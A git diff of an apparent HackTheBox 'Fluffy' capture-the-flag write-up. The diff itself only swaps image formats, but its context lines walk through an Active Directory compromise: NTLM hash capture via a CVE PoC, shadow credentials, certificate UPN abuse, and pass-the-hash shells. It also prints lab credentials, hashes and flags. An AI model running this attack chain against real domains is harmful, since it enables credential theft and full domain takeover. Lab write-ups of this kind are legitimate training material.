@@ -79,21 +79,21 @@ Nmap done: 1 IP address (1 host up) scanned in 94.94 seconds
 
 Then I checked which shares we have access to and saw an interesting one: `IT`. Notice that we have READ and WRITE permissions.
 
-![IT share with READ,WRITE permissions](/images/fluffy/2.png)
+![IT share with READ,WRITE permissions](/images/fluffy/2.webp)
 
 I took a closer look at the IT share and downloaded the PDF to check what's inside.
 
-![Listing and downloading files from the IT share](/images/fluffy/1.png)
+![Listing and downloading files from the IT share](/images/fluffy/1.webp)
 
 And I saw this:
 
-![PDF listing recent CVEs](/images/fluffy/3.png)
+![PDF listing recent CVEs](/images/fluffy/3.webp)
 
 I started looking these CVEs up and stopped at CVE-2025-24071. Since we have write permission on the IT share, we can use it.
 
 For this CVE I used this PoC: [Marcejr117/CVE-2025-24071_PoC](https://github.com/Marcejr117/CVE-2025-24071_PoC)
 
-![Generating the payload with the PoC](/images/fluffy/4.png)
+![Generating the payload with the PoC](/images/fluffy/4.webp)
 
 Next I ran `ip a` to check my HTB interface name, which for me is `tun0`, then started Responder:
 
@@ -103,15 +103,15 @@ sudo responder -I tun0
 
 Put `exploit.zip` inside the IT share:
 
-![Uploading exploit.zip to the IT share](/images/fluffy/5.png)
+![Uploading exploit.zip to the IT share](/images/fluffy/5.webp)
 
 After a while I got a username and a hash in Responder:
 
-![Responder capturing the NTLMv2 hash for p.agila](/images/fluffy/6.png)
+![Responder capturing the NTLMv2 hash for p.agila](/images/fluffy/6.webp)
 
 I quickly cracked that hash and got the final credentials: `p.agila:prometheusx-303`
 
-![Cracking the captured hash](/images/fluffy/7.png)
+![Cracking the captured hash](/images/fluffy/7.webp)
 
 Next I ran bloodhound-python and uploaded the zip to the BloodHound GUI:
 
@@ -123,15 +123,15 @@ Of course BloodHound threw an error on startup, so me and Claude had to debug fo
 
 I checked what `p.agila` can do, and we see she has `GenericAll` over the `Service Accounts` group.
 
-![p.agila has GenericAll over the Service Accounts group](/images/fluffy/8.png)
+![p.agila has GenericAll over the Service Accounts group](/images/fluffy/8.webp)
 
 So I checked deeper what the `Service Accounts` group can do, and saw they have `GenericWrite` over 3 users.
 
-![Service Accounts has GenericWrite over three users](/images/fluffy/9.png)
+![Service Accounts has GenericWrite over three users](/images/fluffy/9.webp)
 
 First I went for the `winrm_svc` account, so my path looked like this:
 
-![Attack path to winrm_svc](/images/fluffy/10.png)
+![Attack path to winrm_svc](/images/fluffy/10.webp)
 
 So I added myself to the `Service Accounts` group:
 
@@ -139,7 +139,7 @@ So I added myself to the `Service Accounts` group:
 bloodyad --host 10.129.35.212 -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember "Service Accounts" p.agila
 ```
 
-![Adding p.agila to Service Accounts](/images/fluffy/11.png)
+![Adding p.agila to Service Accounts](/images/fluffy/11.webp)
 
 For some reason it didn't work the first time, so I ran this command and repeated the process:
 
@@ -147,7 +147,7 @@ For some reason it didn't work the first time, so I ran this command and repeate
 nxc ldap 10.129.35.212 -u p.agila -p 'prometheusx-303' -M groupmembership -o USER=p.agila
 ```
 
-![Checking group membership](/images/fluffy/12.png)
+![Checking group membership](/images/fluffy/12.webp)
 
 Then ran this command to get the `winrm_svc` NT hash:
 
@@ -155,7 +155,7 @@ Then ran this command to get the `winrm_svc` NT hash:
 certipy-ad shadow auto -u p.agila -p 'prometheusx-303' -account winrm_svc -dc-ip 10.129.35.212
 ```
 
-![Shadow credentials attack against winrm_svc](/images/fluffy/13.png)
+![Shadow credentials attack against winrm_svc](/images/fluffy/13.webp)
 
 And I hit the classic mistake of forgetting to sync the clock skew, so I used this command:
 
@@ -163,7 +163,7 @@ And I hit the classic mistake of forgetting to sync the clock skew, so I used th
 sudo ntpdate 10.129.35.212
 ```
 
-![Syncing the clock with the DC](/images/fluffy/14.png)
+![Syncing the clock with the DC](/images/fluffy/14.webp)
 
 We got the NT hash for `winrm_svc`: `33bd09dcd697600edf6b3a7af4875767`
 
@@ -175,19 +175,19 @@ evil-winrm -i 10.129.35.212 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
 
 And we get the user flag: `f0371bc3cc11b036a7d2235736ca5bd2`
 
-![Shell as winrm_svc with the user flag](/images/fluffy/15.png)
+![Shell as winrm_svc with the user flag](/images/fluffy/15.webp)
 
 Taking a couple of steps back, I saw we could also get access to the `ca_svc` account.
 
-![Access to the ca_svc account](/images/fluffy/16.png)
+![Access to the ca_svc account](/images/fluffy/16.webp)
 
 Going deeper, I saw it's part of the `Cert Publishers` group.
 
-![ca_svc is a member of Cert Publishers](/images/fluffy/17.png)
+![ca_svc is a member of Cert Publishers](/images/fluffy/17.webp)
 
 So we take over the `ca_svc` account. The path is similar to the previous one:
 
-![Attack path to ca_svc](/images/fluffy/18.png)
+![Attack path to ca_svc](/images/fluffy/18.webp)
 
 Commands:
 
@@ -209,7 +209,7 @@ Check our groups again:
 nxc ldap 10.129.35.212 -u p.agila -p 'prometheusx-303' -M groupmembership -o USER=p.agila
 ```
 
-![Confirming group membership](/images/fluffy/19.png)
+![Confirming group membership](/images/fluffy/19.webp)
 
 Steal the `ca_svc` account:
 
@@ -217,7 +217,7 @@ Steal the `ca_svc` account:
 certipy-ad shadow auto -u p.agila -p 'prometheusx-303' -account ca_svc -dc-ip 10.129.35.212
 ```
 
-![Shadow credentials attack against ca_svc](/images/fluffy/20.png)
+![Shadow credentials attack against ca_svc](/images/fluffy/20.webp)
 
 And I got the hash: `ca0f4f9e9eb8a092addf53bb03fc98c8`
 
@@ -275,7 +275,7 @@ Change your UPN to `administrator`:
 certipy-ad account -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.35.212 -upn 'administrator' -user ca_svc update
 ```
 
-![Changing the ca_svc UPN to administrator](/images/fluffy/21.png)
+![Changing the ca_svc UPN to administrator](/images/fluffy/21.webp)
 
 Request a certificate for administrator:
 
@@ -283,7 +283,7 @@ Request a certificate for administrator:
 certipy-ad req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.35.212 -target DC01.fluffy.htb -target-ip 10.129.35.212 -ca 'fluffy-DC01-CA' -template 'User'
 ```
 
-![Requesting the certificate](/images/fluffy/22.png)
+![Requesting the certificate](/images/fluffy/22.webp)
 
 Change the UPN back to its original value:
 
@@ -291,7 +291,7 @@ Change the UPN back to its original value:
 certipy-ad account -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.35.212 -upn 'ca_svc@fluffy.htb' -user ca_svc update
 ```
 
-![Restoring the original UPN](/images/fluffy/23.png)
+![Restoring the original UPN](/images/fluffy/23.webp)
 
 Get the administrator hash:
 
@@ -299,7 +299,7 @@ Get the administrator hash:
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.35.212 -username administrator -domain fluffy.htb
 ```
 
-![Authenticating with the certificate to get the NT hash](/images/fluffy/24.png)
+![Authenticating with the certificate to get the NT hash](/images/fluffy/24.webp)
 
 Hash obtained: `8da83a3fa618b6e3a00e93f676c92a6e`
 
@@ -309,7 +309,7 @@ So it's basically over now:
 evil-winrm -i 10.129.35.212 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
 ```
 
-![Shell as administrator with the root flag](/images/fluffy/25.png)
+![Shell as administrator with the root flag](/images/fluffy/25.webp)
 
 root flag: `8cbe8461c6a9f282de5ac2546a03fac0`
 
